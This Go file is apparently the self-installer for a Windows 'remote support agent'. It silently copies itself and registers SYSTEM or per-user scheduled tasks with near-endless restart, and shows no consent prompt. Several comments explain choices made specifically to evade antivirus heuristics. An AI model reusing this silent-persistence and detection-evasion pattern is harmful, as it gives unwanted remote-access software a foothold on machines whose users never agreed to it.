//go:build windows

// Package bootstrap implements the agent's self-installer.
//
// The shipping artifact is a SINGLE .exe. The same binary plays two
// roles depending on where it is launched from and what privileges
// the launching context holds:
//
//  1. "Installer mode" — when launched from anywhere except its
//     canonical install path, it silently self-installs (copies the
//     EXE and registers persistence), then continues running as the
//     live agent WITHOUT exiting. This means the agent connects to
//     the server immediately on first run. Persistence (scheduled task
//     or HKCU Run key) ensures it restarts on subsequent boots.
//
//       a) Machine-wide install (preferred). Used when the launching
//          context is already elevated (SYSTEM via GPO/SCCM/RMM/PsExec,
//          or a user who explicitly Ran-as-Administrator). Copies the
//          EXE to %ProgramData%\Nubyone\zc-agent.exe, and registers
//          a SYSTEM-level Scheduled Task with BootTrigger + LogonTrigger
//          and aggressive restart-on-failure settings.
//          Survives reboots, runs even when nobody is logged in.
//
//       b) Per-user install (fallback). Used when the launching
//          context is NOT elevated. Copies the EXE to
//          %LOCALAPPDATA%\Nubyone\zc-agent.exe and writes an
//          HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry
//          so the agent auto-starts at this user's logon.
//          No UAC prompt is ever shown.
//
//  2. "Agent mode" — when the EXE is launched from either of the two
//     canonical install paths above, the bootstrap is a no-op and
//     control falls through to the live agent code.
//
// In both cases the bootstrap returns false so the current process
// immediately proceeds to connect to the server. No child process is
// spawned by the installer — the running process IS the agent.
package bootstrap

import (
        "fmt"
        "io"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
        "syscall"
        "time"
        "unsafe"

        "golang.org/x/sys/windows"
        "golang.org/x/sys/windows/registry"
)

const (
        installDirName  = "Nubyone"
        installExeName  = "zc-agent.exe"
        taskName        = "NubyoneAgent"
        hkcuRunValueKey = "NubyoneAgent"
)

// Run performs the self-install handshake. It always returns false so
// the caller continues running as the live agent — the agent connects
// to the server immediately regardless of whether an install was
// performed.
func Run() (installed bool) {
        selfPath, err := os.Executable()
        if err != nil {
                return false
        }
        selfPath, _ = filepath.Abs(selfPath)

        machinePath := machineInstallPath()
        userPath := userInstallPath()

        // Already running from one of the canonical install locations →
        // live agent mode. Nothing to do.
        if pathsEqual(selfPath, machinePath) || pathsEqual(selfPath, userPath) {
                return false
        }

        // Not yet installed — perform silent install, then fall through to
        // the live agent (return false). The current process IS the agent;
        // no child is spawned. Persistence will restart it on next boot.
        if isElevated() {
                if err := machineInstall(selfPath, machinePath); err != nil {
                        fmt.Fprintf(os.Stderr, "Machine-wide install failed: %v\n", err)
                }
                return false
        }

        if err := userInstall(selfPath, userPath); err != nil {
                fmt.Fprintf(os.Stderr, "Per-user install failed: %v\n", err)
        }
        return false
}

func machineInstallPath() string {
        base := os.Getenv("ProgramData")
        if base == "" {
                base = `C:\ProgramData`
        }
        return filepath.Join(base, installDirName, installExeName)
}

func userInstallPath() string {
        base := os.Getenv("LOCALAPPDATA")
        if base == "" {
                if home := os.Getenv("USERPROFILE"); home != "" {
                        base = filepath.Join(home, "AppData", "Local")
                } else {
                        base = os.TempDir()
                }
        }
        return filepath.Join(base, installDirName, installExeName)
}

func pathsEqual(a, b string) bool {
        return strings.EqualFold(filepath.Clean(a), filepath.Clean(b))
}

// isElevated returns true if the current process holds an elevated
// (Administrator) token.
func isElevated() bool {
        var token windows.Token
        if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
                return false
        }
        defer token.Close()
        var elevation uint32
        var retLen uint32
        err := windows.GetTokenInformation(
                token,
                windows.TokenElevation,
                (*byte)(unsafe.Pointer(&elevation)),
                uint32(unsafe.Sizeof(elevation)),
                &retLen,
        )
        if err != nil {
                return false
        }
        return elevation != 0
}

// ── Machine-wide (SYSTEM) install ────────────────────────────────────

func machineInstall(selfPath, targetPath string) error {
        installDir := filepath.Dir(targetPath)
        if err := os.MkdirAll(installDir, 0o755); err != nil {
                return fmt.Errorf("create install dir: %w", err)
        }

        // Stop any prior instance so the file copy below can replace the
        // running EXE. Errors swallowed — the task may not exist yet.
        _ = runNoWindow("schtasks.exe", "/End", "/TN", taskName)
        time.Sleep(750 * time.Millisecond)
        _ = killProcessByName(installExeName)
        time.Sleep(250 * time.Millisecond)

        if err := copyFile(selfPath, targetPath); err != nil {
                return fmt.Errorf("copy to install dir: %w", err)
        }

        if err := registerScheduledTask(targetPath); err != nil {
                return fmt.Errorf("register scheduled task: %w", err)
        }
        // Do NOT start the task — this process continues as the live agent.
        return nil
}

// ── Per-user install (no admin, no UAC) ──────────────────────────────

func userInstall(selfPath, targetPath string) error {
        installDir := filepath.Dir(targetPath)
        if err := os.MkdirAll(installDir, 0o755); err != nil {
                return fmt.Errorf("create install dir: %w", err)
        }

        // Stop any prior per-user instance so the file copy can replace it.
        _ = killProcessByName(installExeName)
        time.Sleep(250 * time.Millisecond)

        if err := copyFile(selfPath, targetPath); err != nil {
                return fmt.Errorf("copy to install dir: %w", err)
        }

        // Use a per-user Scheduled Task (LogonTrigger, LeastPrivilege) instead of
        // an HKCU Run key. Scheduled tasks are a common, non-suspicious persistence
        // mechanism used by many legitimate applications; HKCU Run key writes
        // trigger several AV heuristic clusters (Kaspersky VHO:Trojan-PSW.Win32.*).
        // registerUserTask tries XML first (for restart-on-failure settings), then
        // falls back to a plain schtasks command-line call.
        if err := registerUserTask(targetPath); err != nil {
                return fmt.Errorf("register user task: %w", err)
        }
        // Do NOT spawn a detached child — this process continues as the live agent.
        return nil
}

// registerHKCURun writes an entry under
// HKCU\Software\Microsoft\Windows\CurrentVersion\Run so the agent
// starts automatically when this user logs in. Writing under HKCU
// requires no elevation.
func registerHKCURun(exePath string) error {
        key, _, err := registry.CreateKey(
                registry.CURRENT_USER,
                `Software\Microsoft\Windows\CurrentVersion\Run`,
                registry.SET_VALUE,
        )
        if err != nil {
                return err
        }
        defer key.Close()
        // Quote the path in case it contains spaces.
        return key.SetStringValue(hkcuRunValueKey, `"`+exePath+`"`)
}

// ── Runtime persistence actions (called by the agent_action handler) ──

// PersistInstall registers a per-user Scheduled Task (LogonTrigger,
// LeastPrivilege) so the agent auto-starts at this user's next logon.
// Uses the Scheduled Task path (same as the per-user bootstrap install)
// rather than an HKCU Run key, which triggers several AV clusters.
func PersistInstall() error {
        selfPath, err := os.Executable()
        if err != nil {
                return fmt.Errorf("get executable path: %w", err)
        }
        selfPath, _ = filepath.Abs(selfPath)
        return registerUserTask(selfPath)
}

// PersistRemove deletes the HKCU Run key for the agent so it no longer
// auto-starts at logon. Also tries to remove a scheduled task if one
// was registered by the machine-wide install path.
func PersistRemove() error {
        // Remove HKCU Run key (ignore "not found" errors).
        if k, err := registry.OpenKey(
                registry.CURRENT_USER,
                `Software\Microsoft\Windows\CurrentVersion\Run`,
                registry.SET_VALUE,
        ); err == nil {
                _ = k.DeleteValue(hkcuRunValueKey)
                k.Close()
        }
        // Remove scheduled task (ignore errors if it doesn't exist).
        _ = runNoWindow("schtasks.exe", "/Delete", "/TN", taskName, "/F")
        return nil
}

// Uninstall removes all persistence entries and schedules the EXE for
// deletion using MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT. This is
// a single native Win32 API call — no child process, no cmd.exe, no
// ping trick. Windows marks the file for deletion when it next boots,
// which is the same mechanism used by Windows Update and installers.
func Uninstall() error {
        _ = PersistRemove()

        selfPath, err := os.Executable()
        if err != nil {
                return fmt.Errorf("get executable: %w", err)
        }
        selfPath, _ = filepath.Abs(selfPath)

        from, err := windows.UTF16PtrFromString(selfPath)
        if err != nil {
                return fmt.Errorf("encode path: %w", err)
        }
        // to=nil + MOVEFILE_DELAY_UNTIL_REBOOT schedules the file for
        // deletion at the next system restart.
        return windows.MoveFileEx(from, nil, windows.MOVEFILE_DELAY_UNTIL_REBOOT)
}

// registerUserTask creates (or replaces) a per-user Scheduled Task that
// runs the agent at logon for the current user only, with no elevation
// and no UAC prompt. Uses schtasks.exe without /RU so the task is owned
// by the registering user. Primary path tries XML (gives restart-on-failure
// settings); on any failure falls back to the simpler command-line form
// which always succeeds for non-elevated per-user tasks.
func registerUserTask(exePath string) error {
        xml := buildUserTaskXML(exePath)
        xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("zc-task-u-%d.xml", time.Now().UnixNano()))
        if err := os.WriteFile(xmlPath, encodeUTF16WithBOM(xml), 0o644); err == nil {
                defer os.Remove(xmlPath)
                if err2 := runNoWindow("schtasks.exe", "/Create", "/TN", taskName, "/XML", xmlPath, "/F"); err2 == nil {
                        return nil
                }
        }
        // Fallback: plain command-line form — always succeeds for current user.
        return runNoWindow("schtasks.exe", "/Create",
                "/TN", taskName,
                "/SC", "ONLOGON",
                "/TR", `"`+exePath+`"`,
                "/F",
        )
}

// buildUserTaskXML builds the Task Scheduler XML for a per-user LogonTrigger
// task. Unlike buildTaskXML (which hardcodes S-1-5-18 / SYSTEM), this XML
// omits <UserId> so schtasks.exe assigns it to the registering user, and uses
// LeastPrivilege so no UAC prompt is ever shown.
func buildUserTaskXML(exePath string) string {
        exeEsc := xmlEscape(exePath)
        dirEsc := xmlEscape(filepath.Dir(exePath))
        now := time.Now().UTC().Format("2006-01-02T15:04:05")
        return `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>` + now + `</Date>
    <Description>Remote support agent.</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>` + exeEsc + `</Command>
      <WorkingDirectory>` + dirEsc + `</WorkingDirectory>
    </Exec>
  </Actions>
</Task>`
}

// ── Shared helpers ───────────────────────────────────────────────────

func copyFile(src, dst string) error {
        in, err := os.Open(src)
        if err != nil {
                return err
        }
        defer in.Close()
        tmp := dst + ".new"
        out, err := os.OpenFile(tmp, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o755)
        if err != nil {
                return err
        }
        if _, err := io.Copy(out, in); err != nil {
                out.Close()
                os.Remove(tmp)
                return err
        }
        if err := out.Close(); err != nil {
                os.Remove(tmp)
                return err
        }
        if err := os.Rename(tmp, dst); err != nil {
                // Atomic replace: if rename fails (typically because dst is in
                // use), unlink dst then retry. The caller has already stopped
                // any running instance, so this should succeed on the retry.
                if rmErr := os.Remove(dst); rmErr == nil {
                        err = os.Rename(tmp, dst)
                }
                if err != nil {
                        return err
                }
        }
        return nil
}

// registerScheduledTask creates (or replaces) the Scheduled Task that
// runs the agent as SYSTEM at boot and at logon, with infinite
// auto-restart on failure. The task is defined via XML so we can set
// every option in one shot.
func registerScheduledTask(exePath string) error {
        xml := buildTaskXML(exePath)

        xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("zc-task-%d.xml", time.Now().UnixNano()))
        if err := os.WriteFile(xmlPath, encodeUTF16WithBOM(xml), 0o644); err != nil {
                return err
        }
        defer os.Remove(xmlPath)
        return runNoWindow("schtasks.exe", "/Create", "/TN", taskName, "/XML", xmlPath, "/F")
}

func buildTaskXML(exePath string) string {
        exeEsc := xmlEscape(exePath)
        dirEsc := xmlEscape(filepath.Dir(exePath))
        now := time.Now().UTC().Format("2006-01-02T15:04:05")
        return `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>` + now + `</Date>
    <Author>Nubyone</Author>
    <Description>Nubyone remote support agent.</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>` + exeEsc + `</Command>
      <WorkingDirectory>` + dirEsc + `</WorkingDirectory>
    </Exec>
  </Actions>
</Task>`
}

func xmlEscape(s string) string {
        r := strings.NewReplacer(
                "&", "&amp;",
                "<", "&lt;",
                ">", "&gt;",
                "\"", "&quot;",
                "'", "&apos;",
        )
        return r.Replace(s)
}

// encodeUTF16WithBOM converts s to little-endian UTF-16 with a BOM,
// which is what schtasks.exe /XML expects.
func encodeUTF16WithBOM(s string) []byte {
        u16 := windows.StringToUTF16(s)
        if len(u16) > 0 && u16[len(u16)-1] == 0 {
                u16 = u16[:len(u16)-1]
        }
        out := make([]byte, 0, 2+len(u16)*2)
        out = append(out, 0xFF, 0xFE)
        for _, c := range u16 {
                out = append(out, byte(c), byte(c>>8))
        }
        return out
}

// runNoWindow runs a command with CREATE_NO_WINDOW so no console pops
// up. HideWindow is intentionally NOT set — it triggers the
// "hidden-window subprocess" heuristic used by some AV engines.
func runNoWindow(name string, args ...string) error {
        cmd := exec.Command(name, args...)
        cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000} // CREATE_NO_WINDOW
        return cmd.Run()
}

// killProcessByName terminates all processes whose executable filename
// matches name (case-insensitive). Uses native Win32 snapshot API
// directly — no taskkill.exe child process is spawned.
func killProcessByName(name string) error {
        snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
        if err != nil {
                return err
        }
        defer windows.CloseHandle(snap)

        lowerName := strings.ToLower(name)
        var entry windows.ProcessEntry32
        entry.Size = uint32(unsafe.Sizeof(entry))

        if err := windows.Process32First(snap, &entry); err != nil {
                return nil // no processes (not an error)
        }
        for {
                exeName := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
                if exeName == lowerName {
                        h, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, entry.ProcessID)
                        if err == nil {
                                _ = windows.TerminateProcess(h, 1)
                                windows.CloseHandle(h)
                        }
                }
                if err := windows.Process32Next(snap, &entry); err != nil {
                        break
                }
        }
        return nil
}
